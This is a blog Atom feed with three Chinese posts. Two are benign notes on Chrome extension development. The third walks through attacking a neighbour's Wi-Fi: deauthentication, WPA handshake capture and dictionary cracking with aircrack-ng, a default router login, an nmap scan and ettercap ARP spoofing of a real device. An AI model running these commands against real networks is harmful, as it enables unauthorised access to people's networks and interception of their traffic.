<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Yqf's Blog]]></title>
  <subtitle><![CDATA[Day day up.]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yqf3139.github.io/"/>
  <updated>2016-01-01T10:20:09.013Z</updated>
  <id>http://yqf3139.github.io/</id>
  
  <author>
    <name><![CDATA[yqf]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[为coplay Chrome扩展添油加醋]]></title>
    <link href="http://yqf3139.github.io/2016/01/01/the-coplay-chrome-extension/"/>
    <id>http://yqf3139.github.io/2016/01/01/the-coplay-chrome-extension/</id>
    <published>2016-01-01T09:16:57.000Z</published>
    <updated>2016-01-01T10:20:09.013Z</updated>
    <content type="html"><![CDATA[<p>上次参加黑客马拉松之前有一个想法，就是希望能为两个人异地同看一个在线视频提供更好的体验：进度同步，弹幕，实时涂鸦等等。还有更多的实时语言功能就其实直接使用现成的微信就好。这样看来，视频进度同步和播放/暂停和拖动进度条的指令同步是核心功能。</p>
<p>当初想的通信技术方案是搭建一个私有服务器，两个浏览器通过一个<a href="https://zh.wikipedia.org/wiki/%E5%B0%8F%E4%B9%A6%E7%AD%BE" target="_blank" rel="external">Bookmarklet</a>注入脚本，Websocket通信，并由中间的私人服务器中转进行。视频控制准备强制将flash视频转为Html5播放，方便控制，不过拖着一直没去实现。</p>
<p>最近看到一个<a href="https://www.zhihu.com/question/23228162/answer/36767934" target="_blank" rel="external">推荐Chrome插件的知乎回答</a>，答主使用Chrome扩展注入脚本，使用<a href="http://peerjs.com/" target="_blank" rel="external">Peer.js</a>，底层是<a href="https://zh.wikipedia.org/zh/WebRTC" target="_blank" rel="external">WebRTC通信</a>。去中心服务器直接通信，的确方便很多，并且已经支持多个视频站，插件也已经在<a href="https://chrome.google.com/webstore/detail/coplay/heolgpojkkeacaokbpolhalhlaidpkkc/" target="_blank" rel="external">Chrome Web Store</a>上架，并<a href="https://github.com/Justineo/coplay" target="_blank" rel="external">Github开源</a>，试用后立即Star了。</p>
<p>不过应该还有很多功能可以加，查看代码后觉得可扩展性也很好，不过在那之前，我想也许应该支持更多的视频站、让视频同步的体验更好才是纯粹的。</p>
<h1 id="Flash_u7684_u89C6_u9891_u63A7_u5236"><a href="#Flash_u7684_u89C6_u9891_u63A7_u5236" class="headerlink" title="Flash的视频控制"></a>Flash的视频控制</h1><p>之前固执地认为Flash视频是不可与Javascript交互的，2014年HackShanghai的时候，我们需要控制优酷视频的播放，后来由颢神找到了获取视频地址的方法，便转Html5的方式播放。不过那次由于想给用户提供一个更好的体验，很多UI都重写了，视频更加一体地融合在网页中，而这是Flash播放器做不到的。在看coplay源码的时候发现某些视频站已经发布了可以直接使用的API，如优酷的<code>PlayerPause(false);</code>，<code>info = PlayerInfo()；</code>等，可以直接方便地控制，更多的视频站由于自身需要，也加上了对javascript的API，通常我们query到DOM中的flash节点后，可以调用一个方法，比如土豆的<code>player.notify(&#39;play&#39;)</code>，更多是类似<code>player.pauseQiyiVideo()</code>这样。</p>
<p>Flash节点没有办法遍历这些在Flash中对外暴露的方法，那是怎么获得这些API的呢，可能官网上有文档，懒得去找了，跟随网页上Javascript的蛛丝马迹也许也能猜到。</p>
<h1 id="u5C1D_u8BD5_u6DFB_u52A0_u8292_u679C_u53F0_u7684_u9002_u914D_u5668"><a href="#u5C1D_u8BD5_u6DFB_u52A0_u8292_u679C_u53F0_u7684_u9002_u914D_u5668" class="headerlink" title="尝试添加芒果台的适配器"></a>尝试添加芒果台的适配器</h1><p>于是我便开始猜测芒果台的API，在众多Javascript中（看到不少typo）找到了和Flash节点的调用，比如<code>c(&#39;hunantv-player-1&#39;).getActionLogInfo()</code>，不过只是一些视频信息。</p>
<p>我又开始尝试跟踪console中的播放和暂停的log，不过log是从Flash中打出的，或者是eval获得的，无法追踪源头。最终发现了一点Javascript中供Flash调用的回调函数，也没用什么用。我便觉得可能芒果台没有提供对外的API了。</p>
<p>看来硬猜是效率很低的。</p>
<h1 id="u901A_u8FC7_u53CD_u7F16_u8BD1_u83B7_u77E5Flash_u89C6_u9891_u63A7_u5236_u7684API"><a href="#u901A_u8FC7_u53CD_u7F16_u8BD1_u83B7_u77E5Flash_u89C6_u9891_u63A7_u5236_u7684API" class="headerlink" title="通过反编译获知Flash视频控制的API"></a>通过反编译获知Flash视频控制的API</h1><p>回想起之前Flash被Adobe降低优先级的新闻，提到Flash是ActionScript语言编写的，并交由FlashPlayer执行，之前并没有Flash的编程经验，但感觉应该很类似Java和JVM，便搜索到了<a href="https://www.free-decompiler.com/flash/download/" target="_blank" rel="external">一个免费的SWF decompiler</a>，于是兴致勃勃地试了一下。</p>
<p><img src="/images/the-coplay-chrome-extension/ffdec.png" alt="ffdec"></p>
<p>反编译以后几乎是源码，ActionScript也基本上能读懂。查询Adobe文档后定位到<code>ExternalInterface.addCallback()</code>是注册对外的接口，而<code>ExternalInterface.call()</code>是Flash调用外部的Javascript函数，全文搜索反编译的结果很快就能定位到API了。</p>
<p>不过芒果台没有提供Seek，也就是设置视频进度的API，尝试Hack无果，最后还是放弃了。好在Bilibili和Acfun的API比较全，于是我便简单地加上了Bilibili的适配器。</p>
<p>应该来说一个好工具让我们效率倍增，尤其是Hack和性能调优的时候，比如Chrome的Javascript Profiler，Timeline和Trace就很好用，Web调优必备。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>上次参加黑客马拉松之前有一个想法，就是希望能为两个人异地同看一个在线视频提供更好的体验：进度同步，弹幕，实时涂鸦等等。还有更多的实时语言功能就其实直接使用现成的微信就好。这样看来，视频进度同步和播放/暂停和拖动进度条的指令同步是核心功能。</p>
<p>当初想的通信技术方案]]>
    </summary>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="extension" scheme="http://yqf3139.github.io/tags/extension/"/>
    
      <category term="flash" scheme="http://yqf3139.github.io/tags/flash/"/>
    
      <category term="webrtc" scheme="http://yqf3139.github.io/tags/webrtc/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何在 Chrome 插件中访问任意网页中的 JavaScript 变量？]]></title>
    <link href="http://yqf3139.github.io/2015/12/26/establish-a-duplex-communication-between-any-web-page-and-chrome-extension/"/>
    <id>http://yqf3139.github.io/2015/12/26/establish-a-duplex-communication-between-any-web-page-and-chrome-extension/</id>
    <published>2015-12-26T06:42:03.000Z</published>
    <updated>2015-12-26T07:43:03.279Z</updated>
    <content type="html"><![CDATA[<p>在折腾小工具的时候有产生了奇怪的需求，Chrome 插件需要监听任意网页中某个变量的变化，或是访问其中的值。但默认注入的 content.js 和原网页 Javascript 脚本并不运行在一个相同的环境中，无法相互访问。</p>
<p>搜索和自己尝试了如下的解决方法，现罗列如下。</p>
<h1 id="u8BBF_u95EE_u5230_u76EE_u6807_u53D8_u91CF"><a href="#u8BBF_u95EE_u5230_u76EE_u6807_u53D8_u91CF" class="headerlink" title="访问到目标变量"></a>访问到目标变量</h1><p>这个很简单。虽然默认注入的content.js不能访问到原网页的变量，但可以访问和修改Dom，所以再注入一个脚本就好。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    elem.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    elem.charset = <span class="string">'utf-8'</span>;</span><br><span class="line">    elem.addEventListener(<span class="string">'load'</span>, doCallback, <span class="literal">false</span>);</span><br><span class="line">    elem.src = url;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(elem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">url</span>(<span class="params">file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> chrome.extension.getURL(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadScript(url(<span class="string">'inject.js'</span>));</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>在inject.js中便是和原网页一样的javascript环境了，但是问题来了，怎样才能将在此环境下的变量发送到后台插件中呢？</p>
<h1 id="u5EFA_u7ACB_u539F_u7F51_u9875_u4F5C_u7528_u57DF_u4E0E_u63D2_u4EF6_u540E_u53F0_u9875_u9762_u7684_u53CC_u5DE5_u901A_u4FE1"><a href="#u5EFA_u7ACB_u539F_u7F51_u9875_u4F5C_u7528_u57DF_u4E0E_u63D2_u4EF6_u540E_u53F0_u9875_u9762_u7684_u53CC_u5DE5_u901A_u4FE1" class="headerlink" title="建立原网页作用域与插件后台页面的双工通信"></a>建立原网页作用域与插件后台页面的双工通信</h1><p>目标很明确，在inject.js中建立与后台background.js的双工通信，这样我们可以实时将网页中值的变化发送到插件中进行分析……</p>
<p>不过阻碍也很明显，由于chrome的安全策略，inject.js和后台插件虽然能直接连通，但受域名限制，而content.js则可以很轻易连通。所以如果打通inject.js与content.js就好了。</p>
<h2 id="u5916_u90E8_u670D_u52A1_u5668_u4E2D_u8F6C"><a href="#u5916_u90E8_u670D_u52A1_u5668_u4E2D_u8F6C" class="headerlink" title="外部服务器中转"></a>外部服务器中转</h2><p>inject.js和background.js连上相同的websocket服务器中转，问题解决。不过还要多加一个外部服务器。</p>
<h2 id="inject-js_u76F4_u8FDE_u540E_u53F0_u63D2_u4EF6"><a href="#inject-js_u76F4_u8FDE_u540E_u53F0_u63D2_u4EF6" class="headerlink" title="inject.js直连后台插件"></a>inject.js直连后台插件</h2><p>的确，Chrome提供了直连的方法。</p>
<p>首先在<code>manifest.json</code>中申明<code>externally_connectable</code>，需要申明域名限制。正当我兴高采烈地输入<code>*://*/*</code>全匹配后，发现出错，chrome文档如是说：</p>
<blockquote>
<p>This will expose the messaging API to any page which matches the URL patterns you specify. The URL pattern must contain at least a second-level domain - that is, hostname patterns like “<em>“, “</em>.com”, “<em>.co.uk”, and “</em>.appspot.com” are prohibited. </p>
</blockquote>
<p>没有办法做到让所有域名发起的连接都与<code>manifest.json</code>匹配，但对于认可的域名，只需要在inject.js中调用如下API，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ExtensionID = <span class="string">'nnhoaecbdmfokhcnldeiadllnjeebhcb'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make a simple request:</span></span><br><span class="line">chrome.runtime.sendMessage(ExtensionID, &#123;openUrlInEditor: url&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;&#125;);</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<h2 id="inject-js_u6CE8_u5165Dom_u4E8B_u4EF6"><a href="#inject-js_u6CE8_u5165Dom_u4E8B_u4EF6" class="headerlink" title="inject.js注入Dom事件"></a>inject.js注入Dom事件</h2><p>这是网上一个比较通行的办法，可以约定一个Dom元素，再使用<code>MutationObserver</code>监控这个Dom元素即可。<br>不过修改Dom比较重量级，不是很喜欢这种做法。</p>
<h2 id="u8F6E_u8BE2localStorage_u7B49_u516C_u5171_u53EF_u8BBF_u95EE_u53D8_u91CF"><a href="#u8F6E_u8BE2localStorage_u7B49_u516C_u5171_u53EF_u8BBF_u95EE_u53D8_u91CF" class="headerlink" title="轮询localStorage等公共可访问变量"></a>轮询localStorage等公共可访问变量</h2><p>两个脚本均可访问到localStorage，location等变量，所以一方修改一方轮询也是一种办法，不过如果变量发生了多次修改，每次的修改事件就很难及时发出。</p>
<h2 id="SharedWorker_u8F6C_u53D1"><a href="#SharedWorker_u8F6C_u53D1" class="headerlink" title="SharedWorker转发"></a>SharedWorker转发</h2><p>最终试验成功了一种还比较满意的方法，可由 content.js 创建一个 SharedWorker的函数，并将其转换为 Blob ，再使用<code>URL.createObjectURL</code>创建为共享链接存入localStorage ， inject.js 读取后此链接后，两个脚本同时连上同一个 SharedWorker，由 worker 转发消息，可以很好双向通信。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// background.js</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 简单监听来自content.js的转发的内容</span></span><br><span class="line">chrome.extension.onMessage.addListener(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">request, sender, sendResponse</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'bg'</span>, request);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// content.js</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// SharedWorker执行的逻辑，广播信息</span></span><br><span class="line"><span class="keyword">var</span> worker_function = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ports = []</span><br><span class="line">    onconnect = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (e.ports &amp;&amp; e.ports.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = e.ports.length; i &lt; j; i++) &#123;</span><br><span class="line">                e.ports[i].onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">0</span>, n = ports.length; m &lt; n; m++) &#123;</span><br><span class="line">                        ports[m].postMessage(e.data);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ports.push(e.ports[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上述函数转为可访问的URL, 并存入localStorage</span></span><br><span class="line">localStorage.sharedWorkerURL = URL.createObjectURL(<span class="keyword">new</span> Blob([<span class="string">"("</span> +</span><br><span class="line">    worker_function.toString() + <span class="string">")()"</span></span><br><span class="line">], &#123;</span><br><span class="line">    type: <span class="string">'text/javascript'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared = <span class="keyword">new</span> SharedWorker(localStorage.sharedWorkerURL);</span><br><span class="line">shared.port.start();</span><br><span class="line">shared.port.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'content'</span>, e);</span><br><span class="line">    <span class="comment">// 向background.js转发</span></span><br><span class="line">    chrome.extension.sendMessage(&#123;</span><br><span class="line">        greeting: e.data</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'content get bg'</span>, response);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inject.js</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">var</span> shared = <span class="keyword">new</span> SharedWorker(localStorage.sharedWorkerURL);  </span><br><span class="line">shared.port.start();</span><br><span class="line">shared.port.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'inject'</span>, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<h2 id="u4F7F_u7528window-postMessage"><a href="#u4F7F_u7528window-postMessage" class="headerlink" title="使用window.postMessage"></a>使用window.postMessage</h2><p>经网友提醒，参考Chrome开发文档中<a href="https://developer.chrome.com/extensions/content_scripts#host-page-communication" target="_blank" rel="external">针对content script通信的说明</a>。使用window.postMessage可以很好进行双向通信。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在折腾小工具的时候有产生了奇怪的需求，Chrome 插件需要监听任意网页中某个变量的变化，或是访问其中的值。但默认注入的 content.js 和原网页 Javascript 脚本并不运行在一个相同的环境中，无法相互访问。</p>
<p>搜索和自己尝试了如下的解决方法，现罗]]>
    </summary>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="javascript" scheme="http://yqf3139.github.io/tags/javascript/"/>
    
      <category term="web" scheme="http://yqf3139.github.io/tags/web/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[尝试“偷窥”邻居的网络流量]]></title>
    <link href="http://yqf3139.github.io/2015/12/25/try-to-snoop-using-wifi/"/>
    <id>http://yqf3139.github.io/2015/12/25/try-to-snoop-using-wifi/</id>
    <published>2015-12-25T11:35:34.000Z</published>
    <updated>2015-12-25T13:18:38.851Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00__u6298_u817E_u7684_u7F18_u7531"><a href="#0x00__u6298_u817E_u7684_u7F18_u7531" class="headerlink" title="0x00 折腾的缘由"></a>0x00 折腾的缘由</h1><p>不知什么时候看到<a href="http://lcx.cc/?i=4257" target="_blank" rel="external">这篇文章</a>后，我便对其中主人公对一个模拟的邻居进行攻击的过程产生了好奇，由于原文没有详细描述攻击的每一个步骤，便想着什么时候在一个安全的环境下重现一下。</p>
<p>首先明确接下来的操作都是安全无害的，虽然的确劫持到了其他人的一些流量，但并没有继续解密流量了，尝试修改流量也只是针对自己设备。</p>
<p>然后我们来假象这么一个目标，劫持到邻居的流量，这可以用来分析ta，并修改流量，达到浏览器弹窗、修改网页布局的效果。</p>
<p>这简单的实现可以使用古老但好用的<a href="www.zhihu.com/question/20338649">ARP攻击</a>，将目标的流量欺骗到攻击人的网卡上，便可以开展中间人攻击了。不过这要求我们在同一个局域网中，比如连接了同一个无线路由器。一般可以搜索到邻居的无线路由器，一旦破解了其登陆密码，便可以扫描到目标的设备，进行攻击了。</p>
<h1 id="0x01__u5C1D_u8BD5_u7834_u89E3Wifi"><a href="#0x01__u5C1D_u8BD5_u7834_u89E3Wifi" class="headerlink" title="0x01 尝试破解Wifi"></a>0x01 尝试破解Wifi</h1><p>一般我们的设备和邻居的设备不在同一内网中，所以第一难关就是攻克无线路由器。如果像我一样，插上网线发现就已经和邻居在同一内网中，那么就可以跳过这一步了。</p>
<h2 id="u4F7F_u7528_u7684_u6B66_u5668"><a href="#u4F7F_u7528_u7684_u6B66_u5668" class="headerlink" title="使用的武器"></a>使用的武器</h2><p><a href="http://www.aircrack-ng.org/" target="_blank" rel="external">Aircrack-ng</a>是常用的用于破解无线802.11WEP及WPA-PSK加密的工具。Linux用户下载源码编译安装即可。<br>其中需要Ubuntu用户预先<code>apt-get install libnl-3-dev libnl-genl-3-dev</code>安装几个依赖。</p>
<p>Mercury 150Mbps MW150U是一个无线USB网卡，Ubuntu免驱使用，由于可以开启Monitor模式，既可以用于台式机的无线上网，也可以偶尔做做无线网络的实验。</p>
<p>查看网卡后发现我的笔记本网卡和USB网卡都可以用于实验：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">phy0    wlan0       ath9k       Qualcomm Atheros AR9285 Wireless Network</span><br><span class="line">phy1    wlan1       rt2800usb   Ralink Technology, Corp. RT5370</span><br><span class="line"></span><br><span class="line"><span class="escape">``</span>`</span><br></pre></td></tr></table></figure>
<h2 id="u9009_u62E9_u653B_u51FB_u76EE_u6807"><a href="#u9009_u62E9_u653B_u51FB_u76EE_u6807" class="headerlink" title="选择攻击目标"></a>选择攻击目标</h2><p>一切就绪，首先让网卡进入Monitor模式，这运行程序获取到更底层的无线网络数据，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng <span class="operator"><span class="keyword">start</span> wlan1</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span></span><br></pre></td></tr></table></figure>
<p><code>ifconfig</code>后发现<code>wlan1mon</code>。</p>
<p>继续开始审查周围的无线网络，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng <span class="operator"><span class="keyword">start</span> wlan0</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/images/try-to-snoop-using-wifi/searching.png" alt="search"></p>
<p>可以看到周边的无线热点，按照信号强度由强到弱排序，其中<code>BSSID</code>是热点的Mac地址，<code>CH</code>是热点的信道（WIFI2.4Ghz分有13个互相有重叠的信道），<code>ENC</code>是加密方式，可以发现基本都是WPA2加密，<code>ESSID</code>是名称，好了，我们基本就只需要关注这些。</p>
<p>挑选一个victim，记下它的信息。</p>
<h2 id="u6355_u83B7WPA_u7684_u63E1_u624B_u5305"><a href="#u6355_u83B7WPA_u7684_u63E1_u624B_u5305" class="headerlink" title="捕获WPA的握手包"></a>捕获WPA的握手包</h2><p>要想破解无线密码，我们先捕捉两台设备成功握手的包。虽然其中也不含密码，但我们可以用这一信息来暴力验证密码字典中的密码是否正确。</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">sudo</span> <span class="comment">airodump</span><span class="literal">-</span><span class="comment">ng</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ivs</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ignore</span><span class="literal">-</span><span class="comment">negative</span><span class="literal">-</span><span class="comment">one</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">bssid</span> <span class="comment">目标热点MAC</span> <span class="literal">-</span><span class="comment">w</span> <span class="comment">保存文件的名称</span> <span class="literal">-</span><span class="comment">c</span> <span class="comment">信道</span> <span class="comment">wlan1mon</span></span><br><span class="line"><span class="comment">```</span></span><br></pre></td></tr></table></figure>
<p>现在我们看到开始抓包，</p>
<p><img src="/images/try-to-snoop-using-wifi/waiting-for-handshake.png" alt="waiting-for-handshake"></p>
<p>不过是否能快速捕获握手包取决于两个因素，信号强弱、是否现在有活跃的设备正在和热点通信。为了尽快获取到握手包，常规做法是广播中断连接的信号，强制踢设备下线，再连接就有我们想要的握手包了。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -<span class="number">0</span> <span class="number">30</span> -<span class="literal">a</span> 目标热点MAC  wlan1mon</span><br><span class="line"><span class="escape">``</span>`</span><br></pre></td></tr></table></figure>
<p>幸运地话，很快就能看到握手包捕捉成功，</p>
<p><img src="/images/try-to-snoop-using-wifi/get-handshake.png" alt="get-handshake"></p>
<h2 id="u79BB_u7EBF_u7834_u89E3_uFF0C_u62FC_u7B97_u529B_u7684_u65F6_u5019_u5230_u4E86"><a href="#u79BB_u7EBF_u7834_u89E3_uFF0C_u62FC_u7B97_u529B_u7684_u65F6_u5019_u5230_u4E86" class="headerlink" title="离线破解，拼算力的时候到了"></a>离线破解，拼算力的时候到了</h2><p>目前WPA的加密是捕获热点和设备间的握手信息，再离线用密码字典爆破，按理来说都是可以破解的，不过时间不允许我们这么做，由于一般密码很弱，比如8位纯数字，或者是非常常见，如password。一个好的字典囊括了最常见的密码，让我们能瞬间破解很多热点。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w ~/Downloads/dict/<span class="number">0</span>-<span class="number">9.8</span>位纯数密码<span class="class">.txt</span> my-<span class="number">01</span><span class="class">.ivs</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>4T 2.2GHz的破解速度只有90000个/秒的破解速度，把0-9的8位纯数密码扫描一遍要1000分钟了。</p>
<p>不过常见密码是很好破解的，</p>
<p><img src="/images/try-to-snoop-using-wifi/get-passwd.png" alt="get-passwd"></p>
<p>所以，<strong>一定要把无线密码设置得非常特殊，长度12位以上，切记切记</strong>，还有防止软件偷走密码去分享。</p>
<h1 id="0x02__u626B_u63CF_u5185_u7F51_u8BBE_u5907"><a href="#0x02__u626B_u63CF_u5185_u7F51_u8BBE_u5907" class="headerlink" title="0x02 扫描内网设备"></a>0x02 扫描内网设备</h1><p>成功登入后，首要访问一下<code>192.168.1.1</code>或<code>192.168.1.253</code>，这是路由器管理界面的常见入口，比如我登的就是admin/admin口令，控制了路由器就更加自由了。可以进行DNS攻击，刷路由器固件等。</p>
<p>如何在不登陆路由器管理界面的情况下，看看内网内的其他设备的情况呢？nmap登场，神级工具之前一直没用过，最近才看到其他人使用。</p>
<p>简单用法如下，更多请参阅<a href="http://blog.csdn.net/zmj_88888888/article/details/9138399" target="_blank" rel="external">他人的简单的教程</a><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  <span class="tag">nmap</span> <span class="tag">-sP</span> 192<span class="class">.168</span><span class="class">.1</span><span class="class">.1-254</span></span><br><span class="line"></span><br><span class="line"><span class="tag">Nmap</span> <span class="tag">scan</span> <span class="tag">report</span> <span class="tag">for</span> <span class="tag">xxxxxxxdeiPhone</span> (192<span class="class">.168</span><span class="class">.1</span><span class="class">.7</span>)</span><br><span class="line"><span class="tag">Host</span> <span class="tag">is</span> <span class="tag">up</span> (0<span class="class">.031s</span> <span class="tag">latency</span>).</span><br><span class="line"><span class="tag">All</span> 100 <span class="tag">scanned</span> <span class="tag">ports</span> <span class="tag">on</span> <span class="tag">feixiandeiPhone</span> (192<span class="class">.168</span><span class="class">.1</span><span class="class">.7</span>) <span class="tag">are</span> <span class="tag">closed</span></span><br><span class="line"><span class="tag">MAC</span> <span class="tag">Address</span>: <span class="tag">XX</span><span class="pseudo">:XX</span><span class="pseudo">:XX</span><span class="pseudo">:XX</span><span class="pseudo">:XX</span> (<span class="tag">Apple</span>)</span><br><span class="line"><span class="tag">Too</span> <span class="tag">many</span> <span class="tag">fingerprints</span> <span class="tag">match</span> <span class="tag">this</span> <span class="tag">host</span> <span class="tag">to</span> <span class="tag">give</span> <span class="tag">specific</span> <span class="tag">OS</span> <span class="tag">details</span></span><br><span class="line"><span class="tag">Network</span> <span class="tag">Distance</span>: 1 <span class="tag">hop</span></span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure></p>
<p>哈，发现一个人的iPhone。</p>
<h1 id="0x03__u7B80_u5355_u8FDB_u884CArp_u653B_u51FB"><a href="#0x03__u7B80_u5355_u8FDB_u884CArp_u653B_u51FB" class="headerlink" title="0x03 简单进行Arp攻击"></a>0x03 简单进行Arp攻击</h1><p>现在，真正的攻击上演了。我们要将上面找到的victim的流量欺骗到我们的网卡上，<a href="https://ettercap.github.io/ettercap/" target="_blank" rel="external">ettercap</a>登场，<code>apt-get</code>安装即可。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan1 -T -M arp:remote /<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="comment">// /192.168.1.7//</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
